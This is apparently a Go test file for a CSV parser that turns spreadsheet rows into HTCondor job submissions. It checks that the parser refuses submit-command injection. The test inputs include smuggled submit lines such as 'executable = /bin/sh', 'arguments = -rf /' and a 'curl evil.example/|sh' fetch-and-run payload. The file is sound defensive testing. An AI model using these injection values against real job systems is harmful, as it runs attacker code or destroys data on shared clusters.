// Copyright 2026 Morgridge Institute for Research
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package sftpjobs

import (
	"strings"
	"testing"

	htcondor "github.com/htcondor/golang-htcondor"
)

func parse(t *testing.T, text string) (*Submission, error) {
	t.Helper()
	return ParseCSV(strings.NewReader(text), CSVLimits{})
}

func TestParseCSVHeaderNamesTheVariables(t *testing.T) {
	sub, err := parse(t, "sample,reads\nA,a.fastq\nB,b.fastq\n")
	if err != nil {
		t.Fatalf("ParseCSV: %v", err)
	}
	if len(sub.Vars) != 2 || sub.Vars[0] != "sample" || sub.Vars[1] != "reads" {
		t.Errorf("vars = %v, want [sample reads]", sub.Vars)
	}
	want := []string{"A,a.fastq", "B,b.fastq"}
	if len(sub.Rows) != len(want) {
		t.Fatalf("rows = %v, want %v", sub.Rows, want)
	}
	for i := range want {
		if sub.Rows[i] != want[i] {
			t.Errorf("row %d = %q, want %q", i, sub.Rows[i], want[i])
		}
	}
}

func TestParseCSVTrimsHeaderSpaceOnly(t *testing.T) {
	sub, err := parse(t, " sample , reads \nA,b\n")
	if err != nil {
		t.Fatalf("ParseCSV: %v", err)
	}
	if sub.Vars[0] != "sample" || sub.Vars[1] != "reads" {
		t.Errorf("vars = %v, want them trimmed", sub.Vars)
	}
}

// TestParseCSVRefusesInjection is the one that matters. A row containing
// "))" ends the inline itemdata block in the submit parser, and whatever
// follows is read as submit-file text -- submit command injection from a
// spreadsheet cell.
func TestParseCSVRefusesInjection(t *testing.T) {
	for _, tc := range []struct{ name, text, wantErrHas string }{
		{
			"closes the itemdata block",
			"sample\nA\nx))\nexecutable = /bin/sh\n",
			"))",
		},
		{
			"closes it mid-value",
			"a,b\nok,fine\nx,y))\narguments = -rf /\n",
			"))",
		},
		{
			"macro expansion",
			"sample\n$ENV(HOME)\n",
			"$",
		},
		{
			"macro reference",
			"sample\n$(executable)\n",
			"$",
		},
		{
			"a line break would split the row",
			"sample\n\"two\nlines\"\n",
			"line break",
		},
		{
			"a comma would add a column",
			"sample\n\"a,b\"\n",
			"separates one column",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := parse(t, tc.text)
			if err == nil {
				t.Fatal("accepted")
			}
			if !strings.Contains(err.Error(), tc.wantErrHas) {
				t.Errorf("error = %v, want it to mention %q", err, tc.wantErrHas)
			}
		})
	}
}

// TestParseCSVRefusesRowsTheParserWouldDrop: a row the submit parser
// silently drops costs somebody a job with no error anywhere, which is
// worse than refusing the file.
func TestParseCSVRefusesRowsTheParserWouldDrop(t *testing.T) {
	for _, tc := range []struct{ name, text, wantErrHas string }{
		{"a comment row", "sample\nA\n#B\n", "comment"},
		{"a comment row with space", "sample\nA\n  # B\n", "comment"},
		{"an empty value", "sample\nA\n\"\"\n", "empty"},
		{"a whitespace-only value", "sample\nA\n\"   \"\n", "empty"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := parse(t, tc.text)
			if err == nil {
				t.Fatal("accepted a row the submit parser would drop")
			}
			if !strings.Contains(err.Error(), tc.wantErrHas) {
				t.Errorf("error = %v, want it to mention %q", err, tc.wantErrHas)
			}
		})
	}
}

// TestParseCSVRefusesAShortRow: padding it would run a job on an empty
// input it was never given.
func TestParseCSVRefusesAShortRow(t *testing.T) {
	_, err := parse(t, "sample,reads\nA,a.fastq\nB\n")
	if err == nil {
		t.Fatal("accepted a row with fewer values than the header")
	}
	for _, want := range []string{"row 3", "1 value", "names 2"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error = %v, want it to mention %q", err, want)
		}
	}
}

func TestParseCSVRefusesALongRow(t *testing.T) {
	_, err := parse(t, "sample\nA\nB,extra\n")
	if err == nil || !strings.Contains(err.Error(), "row 3") {
		t.Errorf("error = %v, want it to name row 3", err)
	}
}

func TestParseCSVHeaderRules(t *testing.T) {
	for _, tc := range []struct{ name, text, wantErrHas string }{
		{"empty name", ",reads\nA,b\n", "needs a name"},
		{"space in a name", "my sample\nA\n", "not usable"},
		{"macro-looking name", "$(x)\nA\n", "not usable"},
		{"leading digit", "1sample\nA\n", "not usable"},
		{"duplicate", "sample,sample\nA,B\n", "one submit variable"},
		{"duplicate differing in case", "Sample,sample\nA,B\n", "one submit variable"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := parse(t, tc.text)
			if err == nil {
				t.Fatal("accepted")
			}
			if !strings.Contains(err.Error(), tc.wantErrHas) {
				t.Errorf("error = %v, want it to mention %q", err, tc.wantErrHas)
			}
		})
	}
}

func TestParseCSVRefusesNothingToDo(t *testing.T) {
	for _, tc := range []struct{ name, text, wantErrHas string }{
		{"empty file", "", "empty"},
		{"header only", "sample\n", "no rows"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := parse(t, tc.text); err == nil {
				t.Fatal("accepted a CSV that would create no jobs")
			} else if !strings.Contains(err.Error(), tc.wantErrHas) {
				t.Errorf("error = %v, want it to mention %q", err, tc.wantErrHas)
			}
		})
	}
}

func TestParseCSVLimits(t *testing.T) {
	t.Run("rows", func(t *testing.T) {
		var b strings.Builder
		b.WriteString("sample\n")
		for i := 0; i < 11; i++ {
			b.WriteString("value\n")
		}
		_, err := ParseCSV(strings.NewReader(b.String()), CSVLimits{MaxRows: 10})
		if err == nil || !strings.Contains(err.Error(), "11 rows") {
			t.Errorf("error = %v, want it to report 11 rows against the limit", err)
		}
	})
	t.Run("bytes", func(t *testing.T) {
		text := "sample\n" + strings.Repeat("abcdefgh\n", 100)
		_, err := ParseCSV(strings.NewReader(text), CSVLimits{MaxBytes: 64})
		if err == nil {
			t.Fatal("accepted a file over the byte limit")
		}
	})
	t.Run("columns", func(t *testing.T) {
		header := strings.Join([]string{"a", "b", "c"}, ",")
		_, err := ParseCSV(strings.NewReader(header+"\n1,2,3\n"), CSVLimits{MaxColumns: 2})
		if err == nil || !strings.Contains(err.Error(), "3 columns") {
			t.Errorf("error = %v, want it to report 3 columns", err)
		}
	})
	t.Run("value length", func(t *testing.T) {
		_, err := ParseCSV(strings.NewReader("sample\n"+strings.Repeat("x", 20)+"\n"),
			CSVLimits{MaxValueLen: 8})
		if err == nil || !strings.Contains(err.Error(), "longer than") {
			t.Errorf("error = %v, want a value-length refusal", err)
		}
	})
}

// TestParseCSVErrorsNameTheCell, because the message goes back to
// somebody looking at a spreadsheet, who needs the row and the column
// rather than the rule.
func TestParseCSVErrorsNameTheCell(t *testing.T) {
	_, err := parse(t, "sample,reads\nA,ok\nB,bad))value\n")
	if err == nil {
		t.Fatal("accepted")
	}
	for _, want := range []string{"row 3", `"reads"`} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error = %v, want it to mention %q", err, want)
		}
	}
}

// TestParseCSVAcceptsOrdinaryData keeps the rules from being so strict
// that real spreadsheets bounce.
func TestParseCSVAcceptsOrdinaryData(t *testing.T) {
	text := "sample,reads,threads\n" +
		"HG00096,HG00096_1.fastq.gz,4\n" +
		"HG00097,/data/runs/2026-01/HG00097.fastq.gz,8\n" +
		"with space,a file with spaces.txt,1\n" +
		"dashes-and_underscores,x.dat,16\n"
	sub, err := parse(t, text)
	if err != nil {
		t.Fatalf("ParseCSV refused ordinary data: %v", err)
	}
	if len(sub.Rows) != 4 {
		t.Errorf("got %d rows, want 4", len(sub.Rows))
	}
	if sub.Rows[2] != "with space,a file with spaces.txt,1" {
		t.Errorf("row with spaces = %q", sub.Rows[2])
	}
}

// TestInjectionIsReal is the oracle for the "))" rule: it drives the
// real submit parser with a row the validator refuses, and shows what
// happens if one gets through. Without it the rule rests on having read
// the parser, which is how a wrong belief about a subsystem request once
// reached two PRs.
func TestInjectionIsReal(t *testing.T) {
	const evil = `x))
executable = /bin/sh
arguments = -c "curl evil.example/|sh"
queue`

	// Refused here...
	if _, err := parse(t, "sample\nok\n"+evil+"\n"); err == nil {
		t.Fatal("ParseCSV accepted a row that closes the itemdata block")
	}

	// ...and this is what it is defending against, measured rather than
	// assumed. A clean CSV queues one job per row; the same rows with
	// "))" in one of them do not.
	clean := "executable = /bin/true\nqueue sample from ((\nr1\nr2\nr3\n))\n"
	sfc, err := htcondor.ParseSubmitFile(strings.NewReader(clean))
	if err != nil {
		t.Fatalf("the clean submit file did not parse: %v", err)
	}
	want := sfc.QueueCount()
	if want != 3 {
		t.Fatalf("three rows queued %d jobs; this test's premise is wrong", want)
	}

	// Ending the block early, with a second queue statement so no stray
	// paren turns it into a syntax error.
	injected := "executable = /bin/true\nqueue sample from ((\nr1\nr2))\n" +
		"executable = /bin/sh\nqueue sample from ((\nr3\n))\n"
	sfi, err := htcondor.ParseSubmitFile(strings.NewReader(injected))
	if err != nil {
		// The other outcome, and still a refusal worth making here: the
		// person gets a parse error naming lines they never wrote.
		t.Logf("ending the block early produced a parse error: %v", err)
		return
	}
	if got := sfi.QueueCount(); got == want {
		t.Errorf("ending the itemdata block early still queued %d jobs, the same as clean -- "+
			"re-check what the rule is defending against", got)
	} else {
		t.Logf("confirmed: %d jobs instead of %d, so the jobs that run are not the ones listed",
			sfi.QueueCount(), want)
	}
}
